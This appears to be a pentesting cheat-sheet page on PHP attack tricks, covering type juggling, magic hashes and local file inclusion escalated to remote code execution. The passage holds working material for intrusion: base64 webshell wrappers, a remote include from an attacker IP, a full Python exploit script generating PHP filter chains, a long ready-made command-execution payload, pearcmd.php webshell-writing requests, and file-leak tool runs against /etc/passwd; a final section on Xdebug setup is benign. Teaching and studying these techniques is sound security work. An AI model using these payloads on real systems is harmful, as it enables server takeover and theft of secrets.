---
description: Some tricks specific to the PHP web programming language
---

# PHP

## # Related Pages

{% content-ref url="../web/frameworks/wordpress.md" %}
[wordpress.md](../web/frameworks/wordpress.md)
{% endcontent-ref %}

## Type Juggling

When code uses `==` or `!=` instead of `===` or `!==` the user may use certain strings to do weird stuff with PHP converting strings to integers

```php
# true in PHP 4.3.0+
'0e0' == '0e1'
'0e0' == '0E1'
'10e2' == ' 01e3'
'10e2' == '01e3'
'10e2' == '1e3'
'010e2' == '1e3'
'010e2' == '01e3'
'10' == '010'
'10.0' == '10'
'10' == '00000000010'
'12345678' == '00000000012345678'
'0010e2' == '1e3'
'123000' == '123e3'
'123000e2' == '123e5'

# true in 5.2.1+
# false in PHP 4.3.0 - 5.2.0
'608E-4234' == '272E-3063'

# true in PHP 4.3.0 - 5.6.x
# false in 7.0.0+
'0e0' == '0x0'
'0xABC' == '0xabc'
'0xABCdef' == '0xabcDEF'
'000000e1' == '0x000000'
'0xABFe1' == '0xABFE1'
'0xe' == '0Xe'
'0xABCDEF' == '11259375'
'0xABCDEF123' == '46118400291'
'0x1234AB' == '1193131'
'0x1234Ab' == '1193131'

# true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+
'0xABCdef' == ' 0xabcDEF'
'1e1' == '0xa'
'0xe' == ' 0Xe'
'0x123' == ' 0x123'

# true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0
# false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+
'0e0' == '0x0a'

# true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+
'0xe' == ' 0Xe.'
```

### Magic Hashes

{% embed url="https://github.com/spaze/hashes" %}
Collection of weird hashes that can be used for PHP Type Juggling
{% endembed %}

```
md5: 240610708:0e462097431906509019562988736854
sha1: aaroZmOk:0e66507019969427134894567494305185566735
sha256: 34250003024812:0e46289032038065916139621039085883773413820991920706299695051332
```

### Comparison rules

In PHP (< 8.0) the following table of rules applies when loosely comparing variables:

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>A table showing common loose comparisons with interesting values</p></figcaption></figure>

For a complete and detailed guide on every possible comparison between types, see [the PHP docs](https://www.php.net/manual/en/language.types.type-juggling.php).&#x20;

{% hint style="warning" %}
The `"php" == 0` case was so weird, that from PHP 8.0 onward, this is no longer true. However, the `"php" == true` still works ([see test](https://onlinephp.io/c/b435e)).
{% endhint %}

## Local File Inclusion

When some code uses the `include`, `include_once`, `require` or `require_once` keyword to include a file from user input (eg. `$_GET['page']`) you can include any file on the system using Directory Traversal.&#x20;

The functions run PHP code in the files that are included. If you can upload any file, put PHP code in there, and when you include it, it will be executed.&#x20;

If the response is PHP code, it will be executed and not shown to you, which could be a problem. If you want to read source-code of the `.php` files, you can use the following PHP filter to convert the file to base64 before interpreting it:

```url
php://filter/convert.base64-encode/resource=index.php
```

{% hint style="info" %}
You can read PHP files like this even if `.php` is appended to your input in the code. Because the last part of this PHP filter is `.php` you can just remove it and let the code add it back
{% endhint %}

### RCE using PHP Filters

The main goal for getting RCE from LFI is to get some arbitrary content returned by the URL, which is then included and read as PHP code. If you control the start of the URL in some include function, you can use [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) to get content from other places than straight from a file. The `data://` wrapper for example can return arbitrary content, for example, using the `base64` encoding:

{% code title="PHP wrappers with a shell" %}
```url
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4=
http://$YOUR_IP/shell.php
```
{% endcode %}

However, in more recent versions of PHP, the `allow_url_include=` option which enables some of these wrappers is **disabled by default**. However, there is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this, you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyway from the default functionality of the site, so this is pretty much a guarantee.&#x20;

{% code title="Example vulnerable code" %}
```php
<?php include $_GET["page"] + ".php" ?>
```
{% endcode %}

Read the writeup linked above to understand how they found it, but here's the basic idea:

* `convert.iconv.UTF8.CSISO2022KR` will always prepend `\x1b$)C` to the string
* `convert.base64-decode` is extremely tolerant, it will basically just ignore any characters that aren't valid base64.

Combining these and a lot of `convert.iconv` to convert between encodings, we can get any arbitrary base64 string that we can decode and include. Here's the exploit script used to automatically do this for a PHP shell, and then execute commands using it:

```python
import requests

url = "http://localhost/index.php"  # CHANGE to vulnerable URL
file_to_use = "/etc/passwd"  # CHANGE to any file on target
command = "/readflag"  # CHANGE to command to be executed

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "action": "include",    
    "file": final_payload   # CHANGE to parameter where file is included
})

print(r.text)
```

For arbitrary contents instead of just the ``<?=`$_GET[0]`;;?>`` needed here, check out the [list of all base64 characters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements) that Carlos Polop made. Synacktiv later also made a tool that automates it:

{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}
Tool to quickly generate PHP filter chains with arbitrary content
{% endembed %}

<details>

<summary>Payload: <code>&#x3C;?=`$_GET[0]`?></code></summary>

{% code overflow="wrap" %}
```bash
?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
{% endcode %}

</details>

### RCE using `pearcmd.php`

Recently a new technique was developed for cases where you **don't control the start** of the `include` path. In such cases, you cannot use wrappers, but directory traversal using `../` is still possible. This opens up the possibility of using other existing PHP files on the system to execute arbitrary code, which the following writeup found a technique for:

{% embed url="https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp#0x06-pearcmdphp" %}
Using `pearcmd.php` to get RCE from local file inclusion through directory traversal
{% endembed %}

{% code title="Vulnerable code" %}
```php
<?php
include 'includes/' . $_GET['page'] . '.php';
```
{% endcode %}

This technique is especially useful if `.php` is **appended** to your input like many `?page=` parameters. Because the `/usr/local/lib/php/pearcmd.php` file fits this requirement it is very usable. To interact with this script we use the query string which is passed as command-line arguments. The `config-create` subcommand allows us to write a file anywhere with some content we control, perfect for writing a webshell!

Even if the user has **no write privileges to the webroot**, we already have a directory traversal on the include function to be able to do this in the first place, so we can re-use it later to include the file we write executing the payload. We will write it to the `/tmp` folder with a simple shell that runs the `?0=` parameter as a system command:

{% code title="/tmp/shell.php" %}
```php
<?=`$_GET[0]`?>
```
{% endcode %}

Note that the config file we will write contains this string multiple times, so the command is executed and its output is included in the response multiple times. We first use the directory traversal to include the `pearcmd.php` file and write the config with a PHP shell:

{% code title="Request 1" overflow="wrap" %}
```http
GET /?+config-create+/&page=../../../../usr/local/lib/php/pearcmd&/<?=`$_GET[0]`?>+/tmp/shell.php HTTP/1.1
Host: localhost
```
{% endcode %}

You should receive a verbose `CONFIGURATION ...` response if this was successful. Then the only thing left to do is execute our written webshell with the same vulnerability:

{% code title="Request 2" %}
```http
GET /?page=../../../../tmp/shell&0=id HTTP/1.1
Host: localhost:8000
```
{% endcode %}

{% code overflow="wrap" %}
```
#PEAR_Config 0.9
a:13:{s:7:"php_dir";s:70:"/&page=../../../../usr/local/lib/php/pearcmd&/uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```
{% endcode %}

{% hint style="warning" %}
**Note**: The `/usr/local/lib/php/pearcmd.php` file we abuse here does not exist on all setups. It is included in PHP < 7.3 by default, and version > 7.4 if the `--with-pear` option was used to compile it. Any _official docker image_ however does include it, so in many instances, you will find this file.
{% endhint %}

### RCE using Session file

Another way is using PHP sessions, which store your session data in `/tmp/sess_[PHPSESSID]` which you can access using your own `PHPSESSID=` cookie on the site. Anything saved to `$_SESSION[]` in the code will be saved to this file. If you put PHP code into your session and include it, the PHP code will be executed.

{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/extortion" %}
A short writeup showing this attack in practice (fun fact, my first ever blog post!)
{% endembed %}

### RCE using logs

You can include log files with your input in them, which can contain PHP code to be executed on include. The `User-Agent` is often saved to logs:

{% code title="Common log file locations" %}
```
/var/log/apache2/access.log
/var/log/httpd/access.log
/var/log/nginx/access.log
```
{% endcode %}

If you can't find the logs you might be able to find it by looking at the configuration of the server, you can include/read any file after all:

{% code title="Common config file locations" %}
```
/etc/apache2/apache2.conf
/opt/apache2/apache2.conf
/usr/local/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
/usr/local/etc/httpd/httpd.conf
```
{% endcode %}

### Reading Files from error-based oracle

A trick using [`php://filter`](https://www.php.net/manual/en/filters.php) was shown in [#rce-using-php-filters](php.md#rce-using-php-filters "mention") to craft any arbitrary string from any other content by chaining filters. It was discovered however that this idea could be brought even further in order to **leak file content** when it is **not reflected**. Here is a vulnerable code example:

```php
<?php
file($_POST['file']);  // Open the file but don't do anything with it
```

This type of code may be common in a backend process that the user doesn't directly notice. While nothing is reflected back, an attacker can still leak the content of the file by carefully crafting PHP filters that expand exponentially when a certain character is in a certain place. By creating many of these filter chains they can begin to leak all the characters of the file one by one.&#x20;

For a more technical breakdown, see the following writeup:

{% embed url="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle" %}
Detailed walkthrough of the error-based filter chain oracle, including **vulnerable functions** and a **tool**
{% endembed %}

In the above post, they also include a tool for exploiting such vulnerabilities automatically by telling it your request endpoint and parameters:

{% embed url="https://github.com/synacktiv/php_filter_chains_oracle_exploit" %}
Exploit the vulnerability easily by passing your request via the CLI
{% endembed %}

In a real-world scenario, this could be used to potentially leak secret keys or passwords stored in files like `config.php` or `.env`. Another thing to keep in mind is that the error-based method might not work if a server treats warnings as errors. In such cases, you can use the alternative _timing attack_ built-in because these high-memory operations take more time to exponentially grown than others.

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ python3 filters_chain_oracle_exploit.py --verb POST --target http://localhost:8000 --file '/flag.txt' --parameter 'file'
</strong>[*] The following URL is targeted : http://localhost:8000
[*] The following local file is leaked : /test
[*] Running GET requests
[+] File /flag leak is finished!
b'Q1RGe2Y0azNfZmw0Z19mMHJfdDNzdDFu'
b'CTF{f4k3_fl4g_f0r_t3st1n'
</code></pre>

{% hint style="info" %}
**Tip**: If your injection is more complex than a POST request with some extra parameters or headers, like a JSON format or multi-step process, you can try to change the `requester.py` -> `req_with_response()` function to include your custom flow.
{% endhint %}

### Reading files using Prefix+Suffix format

The latest development in **filter chain** attacks for LFI is a way to add arbitrary prefixes and suffixes to a file's content, without any noise. This allows parsers expecting a specific format to validate/extract the part you want to leak without the original file having to have that format. \
It is best shown with an example:&#x20;

{% code title="Vulnerable code" %}
```php
<?php
$data = file_get_contents($_POST['url']);
$data = json_decode($data);
echo $data->message;
```
{% endcode %}

Normally, the above code expects a JSON-formatted file like `{"message": "Hello, world"}` and reads its `message` attribute back to the client. While an attacker can change the `$_POST['url']` value to any URL, this would fail on the `json_decode()` function without actually showing the content. This is where the new technique and tool come in:

{% embed url="https://github.com/ambionics/wrapwrap" %}
Generate a filter chain for arbitrary prefixes and suffixes ([blog post](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix))
{% endembed %}

With the techniques outlined in the blog post, it can add characters to the front of the file's content, as well as to the end. The content itself will remain in the center, allowing a simple format like JSON or XML to drag it along to a response that the attacker can see. Then it becomes possible to leak big chunks of a file with a single request, instead of single bits with many requests like in the [#reading-files-from-error-based-oracle](php.md#reading-files-from-error-based-oracle "mention") section.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session">$ ./wrapwrap.py &#x3C;path> &#x3C;prefix> &#x3C;suffix> &#x3C;nb_bytes>
<strong>$ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
</strong>[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=705031).
</code></pre>

This file gets big quickly as you increase the prefix/suffix length, as well as the number of bytes. GET parameters are often limited by a maximum URI length, but POST parameters often lack this maximum and thus allow for giant filter chains like the one above.

{% hint style="info" %}
**Tip**: Using this same technique, you can also simply use it to generate an arbitrary string like in [#rce-using-php-filters](php.md#rce-using-php-filters "mention") without noise like non-ASCII characters. This allows you to exploit even more formats even when they are sanity-checked or parsed!
{% endhint %}

## Debugging

The most well-known debugging protocol for PHP is [Xdebug](https://xdebug.org/). For the cleanest and most realistic experience, use a **VSCode Dev Container** for your workspace as explained in [#debugging](python.md#debugging "mention") for Python.

You will need to add xdebug to the PHP configuration so that any server that runs PHP code on the system will use it. For any setup, paste the output of `php -i` into [xdebug.org/wizard](https://xdebug.org/wizard). _Below_ is a common configuration that _works in most cases_.\
If `pelc` is installed inside the container, setting up `xdebug` is simple:

```docker
RUN yes | pecl install xdebug && \
    echo "zend_extension=xdebug.so" > /usr/local/etc/php/conf.d/xdebug.ini && \
    echo "xdebug.mode=debug" >> /usr/local/etc/php/conf.d/xdebug.ini && \
    echo "xdebug.start_with_request=yes" >> /usr/local/etc/php/conf.d/xdebug.ini
```

In more generic containers, you can build it from scratch:

```docker
RUN apt-get update && \
    apt-get install -y wget
RUN cd $(mktemp -d) && \
    wget https://xdebug.org/files/xdebug-3.4.4.tgz && \
    tar -xzf xdebug-3.4.4.tgz && \
    cd xdebug-3.4.4 && \
    phpize && \
    ./configure && \
    make && \
    cp modules/xdebug.so /usr/local/lib/php/extensions/no-debug-non-zts-20220829/ && \
    echo "zend_extension=xdebug.so" > /usr/local/etc/php/conf.d/xdebug.ini && \
    echo "xdebug.mode=debug" >> /usr/local/etc/php/conf.d/xdebug.ini && \
    echo "xdebug.start_with_request=yes" >> /usr/local/etc/php/conf.d/xdebug.ini
```

Then inside VSCode, install the [**PHP Debug**](https://marketplace.visualstudio.com/items?itemName=xdebug.php-debug) extension and in the ![](<../.gitbook/assets/image (8).png>) panel click _create a launch.json file_ followed by _PHP_. Save this and press the ![](../.gitbook/assets/image.png) button to start the locally-listening server. You can now set any breakpoints in the `.php` files, and when they are executed/requested, the breakpoint will trigger.

To start the server now, run the `CMD` that the `Dockerfile` normally would. It may be inherited from the `FROM` image, in that case, look it up on [Docker Hub](https://hub.docker.com/_/php/tags). In case of Apache2, for example, the command to run will be `apache2-foreground`. Sending an HTTP request to the configured port should now trigger the breakpoints you set in the code.
